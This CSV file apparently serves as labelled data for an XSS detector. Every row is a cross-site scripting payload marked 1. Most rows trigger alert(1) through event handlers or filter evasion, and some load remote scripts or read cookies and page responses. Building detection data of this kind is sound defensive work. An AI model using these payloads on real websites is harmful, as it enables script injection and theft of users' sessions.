payload,label
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00,1
"<button onbeforecopy=""alert(1)"" contenteditable>test</button>",1
"<menu onmouseover=""alert(1)"">test</menu>",1
<cite id=x tabindex=1 onfocus=alert(1)></cite>,1
"<small onkeyup=""alert(1)"" contenteditable>test</small>",1
<ol onfocusout=alert(1) tabindex=1 id=x></ol><input autofocus>,1
&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;,1
"<image draggable=""true"" ondragend=""alert(1)"">test</image>",1
"<style>@keyframes slidein {}</style><iframe style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></iframe>",1
"<form onmouseout=""alert(1)"">test</form>",1
<td id=x tabindex=1 onbeforedeactivate=alert(1)></td><input autofocus>,1
"<pre onmouseup=""alert(1)"">test</pre>",1
"<datalist onmouseout=""alert(1)"">test</datalist>",1
"<style>:target {color:red;}</style><p id=x style=""transition:color 1s"" ontransitionend=alert(1)></p>",1
"<style>@keyframes x{}</style><object style=""animation-name:x"" onanimationstart=""alert(1)""></object>",1
"<dl draggable=""true"" ondrag=""alert(1)"">test</dl>",1
"<bdi onbeforecut=""alert(1)"" contenteditable>test</bdi>",1
<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>,1
"<element onclick=""alert(1)"">test</element>",1
"<a onmousedown=""alert(1)"">test</a>",1
"<rtc ondblclick=""alert(1)"">test</rtc>",1
"<kbd onmouseleave=""alert(1)"">test</kbd>",1
<optgroup onfocusout=alert(1) tabindex=1 id=x></optgroup><input autofocus>,1
"<object onmouseup=""alert(1)"">test</object>",1
<svg><content onload=alert(1)></content>,1
<fieldset id=x tabindex=1 onfocusin=alert(1)></fieldset>,1
"<meter onclick=""alert(1)"">test</meter>",1
"<style>@keyframes x{}</style><noembed style=""animation-name:x"" onanimationstart=""alert(1)""></noembed>",1
¼script¾alert(¢XSS¢)¼/script¾,1
"<IMG SRC=x onmouseover=""alert(String.fromCharCode(88,83,83))"">",1
<keygen id=x tabindex=1 onbeforeactivate=alert(1)></keygen>,1
"<meter onkeydown=""alert(1)"" contenteditable>test</meter>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rtc id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rtc>",1
"<map onbeforepaste=""alert(1)"" contenteditable>test</map>",1
"<iframe oncut=""alert(1)"" contenteditable>test</iframe>",1
"<style>@keyframes x{}</style><header style=""animation-name:x"" onanimationstart=""alert(1)""></header>",1
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;,1
"<style>@keyframes slidein {}</style><data style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></data>",1
"<bdi onmouseleave=""alert(1)"">test</bdi>",1
<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>,1
"<img src=x onerror=\x11""javascript:alert(1)"">",1
"<div draggable=""true"" contenteditable>drag me</div><rtc ondrop=alert(1) contenteditable>drop here</rtc>",1
"<div draggable=""true"" contenteditable>drag me</div><ruby ondrop=alert(1) contenteditable>drop here</ruby>",1
"<fieldset onmousedown=""alert(1)"">test</fieldset>",1
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;,1
"<i onmouseover=""alert(1)"">test</i>",1
"'`""><\x00script>javascript:alert(1)</script>",1
"<div draggable=""true"" contenteditable>drag me</div><body ondrop=alert(1) contenteditable>drop here</body>",1
<script>alert('XSS');</script>,1
"<meta onpaste=""alert(1)"" contenteditable>test</meta>",1
"<style>@keyframes slidein {}</style><output style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></output>",1
<link id=x tabindex=1 onactivate=alert(1)></link>,1
<marquee loop=1 width=0 onfinish=alert(1)>,1
"<track onmousedown=""alert(1)"">test</track>",1
<input onblur=write(XSS) autofocus><input autofocus>,1
"<tbody ondblclick=""alert(1)"">test</tbody>",1
<th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>,1
<IMG SRC=&{javascript:alert(1);};>,1
"<tr draggable=""true"" ondragenter=""alert(1)"">test</tr>",1
"`""'><img src=xxx:x onerror\x0C=javascript:alert(1)>",1
<form onreset=alert(1)><input type=reset>,1
"<img src=""livescript:document.vulnerable=true;"">",1
"<small oncut=""alert(1)"" contenteditable>test</small>",1
"<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>",1
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",1
"<strike onkeydown=""alert(1)"" contenteditable>test</strike>",1
"<div draggable=""true"" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable>drop here</summary>",1
"<script a=`>` SRC=""http://www.securitycompass.com/xss.js""></script>",1
"<;XML ID="";xss"";>;<;I>;<;B>;<;IMG SRC="";javas<;!-- -->;cript:alert(';XSS';)"";>;<;/B>;<;/I>;<;/XML>;",1
"<rb onkeydown=""alert(1)"" contenteditable>test</rb>",1
<ul id=x tabindex=1 onbeforedeactivate=alert(1)></ul><input autofocus>,1
"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 10s"" ontransitioncancel=alert(1)></xss>",1
<s id=x tabindex=1 onbeforeactivate=alert(1)></s>,1
"<figcaption onkeyup=""alert(1)"" contenteditable>test</figcaption>",1
"<track ondblclick=""alert(1)"">test</track>",1
"&lt;IMG SRC=\""jav&#x0A;ascript&#058;alert('XSS');\""&gt;",1
"<i onkeydown=""alert(1)"" contenteditable>test</i>",1
"perl -e ';print "";&;<;SCR\0IPT>;alert("";XSS"";)<;/SCR\0IPT>;"";;'; >; out",1
"<applet onmousemove=""alert(1)"">test</applet>",1
"<element onpaste=""alert(1)"" contenteditable>test</element>",1
&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;,1
<svg><applet onload=alert(1)></applet>,1
"<em onmouseout=""alert(1)"">test</em>",1
"<i onclick=""alert(1)"">test</i>",1
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>,1
"<div draggable=""true"" contenteditable>drag me</div><menu ondrop=alert(1) contenteditable>drop here</menu>",1
"<rb draggable=""true"" ondragleave=""alert(1)"">test</rb>",1
"<map onmousedown=""alert(1)"">test</map>",1
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>,1
<tbody id=x tabindex=1 onbeforeactivate=alert(1)></tbody>,1
"<cite draggable=""true"" ondragenter=""alert(1)"">test</cite>",1
"<title onmouseenter=""alert(1)"">test</title>",1
"<tfoot draggable=""true"" ondragleave=""alert(1)"">test</tfoot>",1
"<title draggable=""true"" ondragend=""alert(1)"">test</title>",1
"<style>:target {color:red;}</style><spacer id=x style=""transition:color 1s"" ontransitionend=alert(1)></spacer>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><keygen id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></keygen>",1
"<noscript onmouseenter=""alert(1)"">test</noscript>",1
"""><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",1
"<nav draggable=""true"" ondragenter=""alert(1)"">test</nav>",1
"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onanimationstart=""alert(1)""></shadow>",1
<p id=x tabindex=1 onfocus=alert(1)></p>,1
<progress onfocusout=alert(1) tabindex=1 id=x></progress><input autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><keygen ondrop=alert(1) contenteditable>drop here</keygen>",1
"<bdi onpaste=""alert(1)"" contenteditable>test</bdi>",1
"<IMG SRC=x onpopstate=""alert(String.fromCharCode(88,83,83))"">",1
"<footer oncopy=""alert(1)"" contenteditable>test</footer>",1
"<XML SRC=""http://ha.ckers.org/xsstest.xml"" ID=I></XML>",1
"<acronym onbeforepaste=""alert(1)"" contenteditable>test</acronym>",1
"ABC<div style=""x:\xE2\x80\x89expression(javascript:alert(1)"">DEF",1
"<style>:target {transform: rotate(180deg);}</style><marquee id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></marquee>",1
"<div style=""x:expression((window.r==1)?'':eval('r=1;",1
"<link onkeydown=""alert(1)"" contenteditable>test</link>",1
"<div draggable=""true"" contenteditable>drag me</div><center ondragover=alert(1) contenteditable>drop here</center>",1
<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>,1
"<style>@keyframes slidein {}</style><template style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></template>",1
"<audio autoplay onplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></caption>",1
&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS,1
"<map onmousemove=""alert(1)"">test</map>",1
<input id=x tabindex=1 onbeforedeactivate=alert(1)></input><input autofocus>,1
"<thead onclick=""alert(1)"">test</thead>",1
<svg><menuitem onload=alert(1)></menuitem>,1
</title><SCRIPT>document.vulnerable=true;</script>,1
<svg><details onload=alert(1)></details>,1
"<article draggable=""true"" ondragleave=""alert(1)"">test</article>",1
<menu onfocusout=alert(1) tabindex=1 id=x></menu><input autofocus>,1
<shadow id=x tabindex=1 ondeactivate=alert(1)></shadow><input id=y autofocus>,1
"<video controls autoplay ontimeupdate=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<u onbeforecut=""alert(1)"" contenteditable>test</u>",1
"<dialog onbeforecopy=""alert(1)"" contenteditable>test</dialog>",1
"<nav onmousemove=""alert(1)"">test</nav>",1
<noframes id=x tabindex=1 onfocusin=alert(1)></noframes>,1
"<details onbeforecut=""alert(1)"" contenteditable>test</details>",1
"<nav draggable=""true"" ondrag=""alert(1)"">test</nav>",1
"<b draggable=""true"" ondrag=""alert(1)"">test</b>",1
"<object onkeyup=""alert(1)"" contenteditable>test</object>",1
"<big draggable=""true"" ondragend=""alert(1)"">test</big>",1
<a id=x tabindex=1 onfocus=alert(1)></a>,1
<img srcset=1 onerror=alert(1)>,1
"<style>@keyframes x{}</style><rtc style=""animation-name:x"" onanimationstart=""alert(1)""></rtc>",1
"<summary onmouseenter=""alert(1)"">test</summary>",1
"<div draggable=""true"" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>",1
"<command draggable=""true"" ondrag=""alert(1)"">test</command>",1
"<col onpaste=""alert(1)"" contenteditable>test</col>",1
"<option onmousedown=""alert(1)"">test</option>",1
</body>,1
"<tfoot draggable=""true"" ondragstart=""alert(1)"">test</tfoot>",1
"<applet ondblclick=""alert(1)"">test</applet>",1
<blink id=x tabindex=1 onbeforedeactivate=alert(1)></blink><input autofocus>,1
"<ins onkeypress=""alert(1)"" contenteditable>test</ins>",1
"<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",1
"<frame onmouseup=""alert(1)"">test</frame>",1
"<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>",1
"<select draggable=""true"" ondragstart=""alert(1)"">test</select>",1
"<p onbeforecopy=""alert(1)"" contenteditable>test</p>",1
"<style>@keyframes x{}</style><hr style=""animation-name:x"" onanimationstart=""alert(1)""></hr>",1
"<style>:target {color: red;}</style><sup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></sup>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></image>",1
"<details draggable=""true"" ondrag=""alert(1)"">test</details>",1
"<form><input type=search onsearch=alert(1) value=""Hit return"" autofocus>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></sub>",1
<rb onblur=alert(1) tabindex=1 id=x></rb><input autofocus>,1
"<li onmouseleave=""alert(1)"">test</li>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></tt>",1
"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationend=""alert(1)""></main>",1
"ABC<div style=""x:\xE2\x80\x8Bexpression(javascript:alert(1)"">DEF",1
"<ol onmouseenter=""alert(1)"">test</ol>",1
&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;,1
"<input onmouseover=""alert(1)"">test</input>",1
"<style>@keyframes slidein {}</style><textarea style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></textarea>",1
"<td onmouseover=""alert(1)"">test</td>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><source id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></source>",1
<listing id=x tabindex=1 onbeforedeactivate=alert(1)></listing><input autofocus>,1
"<var onmouseleave=""alert(1)"">test</var>",1
"<style>:target {color: red;}</style><abbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></abbr>",1
<iframe/src \/\/onload = prompt(1),1
"<u onmouseup=""alert(1)"">test</u>",1
"<element onkeypress=""alert(1)"" contenteditable>test</element>",1
"<style>@keyframes slidein {}</style><audio style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></audio>",1
"<tbody onkeypress=""alert(1)"" contenteditable>test</tbody>",1
<colgroup id=x tabindex=1 onbeforedeactivate=alert(1)></colgroup><input autofocus>,1
<button autofocus onfocusin=alert(1)>test</button>,1
"<label onmouseover=""alert(1)"">test</label>",1
"<style>@keyframes x{}</style><listing style=""animation-name:x"" onanimationstart=""alert(1)""></listing>",1
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationstart=""alert(1)""></canvas>",1
"<em draggable=""true"" ondragend=""alert(1)"">test</em>",1
"<style>@keyframes x{}</style><noframes style=""animation-name:x"" onanimationstart=""alert(1)""></noframes>",1
"<meta draggable=""true"" ondragleave=""alert(1)"">test</meta>",1
"<cite oncut=""alert(1)"" contenteditable>test</cite>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ruby id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ruby>",1
"<element draggable=""true"" ondragstart=""alert(1)"">test</element>",1
"<figcaption onbeforepaste=""alert(1)"" contenteditable>test</figcaption>",1
<image id=x tabindex=1 ondeactivate=alert(1)></image><input id=y autofocus>,1
"<area onmouseleave=""alert(1)"">test</area>",1
"<dt draggable=""true"" ondragenter=""alert(1)"">test</dt>",1
<frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>,1
"<keygen onbeforecut=""alert(1)"" contenteditable>test</keygen>",1
"<address draggable=""true"" ondragenter=""alert(1)"">test</address>",1
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;,1
"<style>:target {color:red;}</style><var id=x style=""transition:color 1s"" ontransitionend=alert(1)></var>",1
"<style>:target {transform: rotate(180deg);}</style><del id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></del>",1
<multicol id=x tabindex=1 onbeforeactivate=alert(1)></multicol>,1
"[<blockquote cite=""]"">["" onmouseover=""alert('RVRSH3LL_XSS');"" ]",1
"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><abbr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></abbr>",1
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",1
"<a href=""\xE2\x80\xA8javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<textarea onmouseup=""alert(1)"">test</textarea>",1
"<q oncut=""alert(1)"" contenteditable>test</q>",1
"<td onmouseenter=""alert(1)"">test</td>",1
"<object src=1 href=1 onerror=""javascript:alert(1)""></object>",1
"<address draggable=""true"" ondragstart=""alert(1)"">test</address>",1
"<script src=""/\%(jscript)s""></script>",1
"<del draggable=""true"" ondrag=""alert(1)"">test</del>",1
"<track draggable=""true"" ondragleave=""alert(1)"">test</track>",1
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationstart=""alert(1)""></fieldset>",1
"<img ondblclick=""alert(1)"">test</img>",1
<shadow id=x tabindex=1 onbeforeactivate=alert(1)></shadow>,1
<head onblur=alert(1) tabindex=1 id=x></head><input autofocus>,1
"<a target=""x"" href=""xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",1
"<mark onmouseover=""alert(1)"">test</mark>",1
<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>,1
"<del onbeforecopy=""alert(1)"" contenteditable>test</del>",1
"<div draggable=""true"" contenteditable>drag me</div><s ondragover=alert(1) contenteditable>drop here</s>",1
"<figure onbeforepaste=""alert(1)"" contenteditable>test</figure>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><canvas id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></canvas>",1
"<element onmouseup=""alert(1)"">test</element>",1
<script id=x tabindex=1 onfocus=alert(1)></script>,1
"<video autoplay onplaying=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<listing oncontextmenu=""alert(1)"">test</listing>",1
"<bdi oncopy=""alert(1)"" contenteditable>test</bdi>",1
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\""",1
"<div draggable=""true"" contenteditable>drag me</div><blink ondrop=alert(1) contenteditable>drop here</blink>",1
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->,1
"<style>:target {transform: rotate(180deg);}</style><mark id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></mark>",1
<plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>,1
"<input onmouseleave=""alert(1)"">test</input>",1
"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationend=""alert(1)""></track>",1
"<style>@keyframes x{}</style><command style=""animation-name:x"" onanimationstart=""alert(1)""></command>",1
<video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>,1
"<a onkeypress=""alert(1)"" contenteditable>test</a>",1
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-,1
<input id=x onfocusin=alert(1)>,1
<embed id=x tabindex=1 ondeactivate=alert(1)></embed><input id=y autofocus>,1
<nextid id=x tabindex=1 onbeforedeactivate=alert(1)></nextid><input autofocus>,1
<image onblur=alert(1) tabindex=1 id=x></image><input autofocus>,1
"<style>@keyframes slidein {}</style><nav style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nav>",1
"<tt onclick=""alert(1)"">test</tt>",1
"<meter draggable=""true"" ondragenter=""alert(1)"">test</meter>",1
<data id=x tabindex=1 ondeactivate=alert(1)></data><input id=y autofocus>,1
&lt;/br style=a:expression(alert())&gt;,1
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,1
"<span onmouseenter=""alert(1)"">test</span>",1
<form id=x tabindex=1 onbeforedeactivate=alert(1)></form><input autofocus>,1
<object id=x tabindex=1 onbeforeactivate=alert(1)></object>,1
<kbd id=x tabindex=1 ondeactivate=alert(1)></kbd><input id=y autofocus>,1
"<isindex oncopy=""alert(1)"" contenteditable>test</isindex>",1
<svg><tfoot onload=alert(1)></tfoot>,1
<rp onblur=alert(1) tabindex=1 id=x></rp><input autofocus>,1
<x contenteditable oninput=alert(1)>input here!,1
"<option draggable=""true"" ondragleave=""alert(1)"">test</option>",1
"<ruby onmousemove=""alert(1)"">test</ruby>",1
"<style>:target {color: red;}</style><samp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></samp>",1
"<style>:target {color: red;}</style><frameset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frameset>",1
"<style>:target {color:red;}</style><listing id=x style=""transition:color 1s"" ontransitionend=alert(1)></listing>",1
"<video onmouseleave=""alert(1)"">test</video>",1
<font id=x tabindex=1 onfocus=alert(1)></font>,1
"&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\""javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\""&gt;&#93;&#93;&gt;",1
"<style>@keyframes slidein {}</style><code style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></code>",1
"<label onmousedown=""alert(1)"">test</label>",1
"<div draggable=""true"" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>",1
"&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",1
"<caption onmouseover=""alert(1)"">test</caption>",1
"<applet onkeydown=""alert(1)"" contenteditable>test</applet>",1
"<style>@keyframes slidein {}</style><svg style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></svg>",1
"<canvas onbeforepaste=""alert(1)"" contenteditable>test</canvas>",1
"<dialog draggable=""true"" ondragend=""alert(1)"">test</dialog>",1
"<mark onmousemove=""alert(1)"">test</mark>",1
"<basefont onbeforecopy=""alert(1)"" contenteditable>test</basefont>",1
"<style>:target {color: red;}</style><noframes id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noframes>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><samp id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></samp>",1
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"">",1
"<blink onkeyup=""alert(1)"" contenteditable>test</blink>",1
"<button onkeydown=""alert(1)"" contenteditable>test</button>",1
<h1 id=x tabindex=1 onbeforeactivate=alert(1)></h1>,1
"<video autoplay controls onseeked=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<rp onkeydown=""alert(1)"" contenteditable>test</rp>",1
"<audio autoplay onplaying=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<noframes onbeforecopy=""alert(1)"" contenteditable>test</noframes>",1
<image src=validimage.png onloadstart=alert(1)>,1
"<div draggable=""true"" contenteditable>drag me</div><div ondrop=alert(1) contenteditable>drop here</div>",1
"<style>:target {color:red;}</style><optgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></optgroup>",1
"<small onmouseover=""alert(1)"">test</small>",1
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1
<menu id=x tabindex=1 onbeforeactivate=alert(1)></menu>,1
"<div draggable=""true"" contenteditable>drag me</div><li ondrop=alert(1) contenteditable>drop here</li>",1
"<xmp onmousedown=""alert(1)"">test</xmp>",1
"'';!--\""&lt;XSS&gt;=&{()}",1
"<nextid onpaste=""alert(1)"" contenteditable>test</nextid>",1
<base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>,1
"<header onpaste=""alert(1)"" contenteditable>test</header>",1
"""`'><script>\x0Djavascript:alert(1)</script>",1
"<div draggable=""true"" contenteditable>drag me</div><isindex ondragover=alert(1) contenteditable>drop here</isindex>",1
"<br draggable=""true"" ondragenter=""alert(1)"">test</br>",1
<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;,1
"<input onmouseenter=""alert(1)"">test</input>",1
"<dfn onclick=""alert(1)"">test</dfn>",1
"<meter onbeforepaste=""alert(1)"" contenteditable>test</meter>",1
"<blockquote onmouseover=""alert(1)"">test</blockquote>",1
"<spacer draggable=""true"" ondragstart=""alert(1)"">test</spacer>",1
"<STYLE>.XSS{background-image:url(""javascript:javascript:alert(1)"");}</STYLE><A CLASS=XSS></A>",1
&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;,1
"<title draggable=""true"" ondragstart=""alert(1)"">test</title>",1
"<footer onclick=""alert(1)"">test</footer>",1
"<textarea onmouseover=""alert(1)"">test</textarea>",1
"<dfn onmousemove=""alert(1)"">test</dfn>",1
"<style>:target {transform: rotate(180deg);}</style><ins id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></ins>",1
"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>",1
"<dd onkeydown=""alert(1)"" contenteditable>test</dd>",1
"<IMG SRC=x ondragstart=""alert(String.fromCharCode(88,83,83))"">",1
"<col draggable=""true"" ondrag=""alert(1)"">test</col>",1
<hr id=x tabindex=1 onactivate=alert(1)></hr>,1
"<style>:target {transform: rotate(180deg);}</style><image id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></image>",1
<embed code=%(scriptlet)s></embed>,1
<dl id=x tabindex=1 onactivate=alert(1)></dl>,1
<script>%(payload)s</script>,1
"<mark onbeforecopy=""alert(1)"" contenteditable>test</mark>",1
<kbd id=x tabindex=1 onbeforedeactivate=alert(1)></kbd><input autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><track ondragover=alert(1) contenteditable>drop here</track>",1
"<acronym oncut=""alert(1)"" contenteditable>test</acronym>",1
"<time ondblclick=""alert(1)"">test</time>",1
"<blockquote draggable=""true"" ondragenter=""alert(1)"">test</blockquote>",1
"<data ondblclick=""alert(1)"">test</data>",1
"<isindex onkeypress=""alert(1)"" contenteditable>test</isindex>",1
"<progress onmousedown=""alert(1)"">test</progress>",1
"<style>:target {color: red;}</style><canvas id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></canvas>",1
&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;,1
"<img src=""blah>"" onmouseover=""document.vulnerable=true;"">",1
"'>""><script src = 'http://www.site.com/XSS.js'></script>",1
"<IMG LOWSRC=""javascript:alert('XSS')"">",1
"<div draggable=""true"" contenteditable>drag me</div><audio ondrop=alert(1) contenteditable>drop here</audio>",1
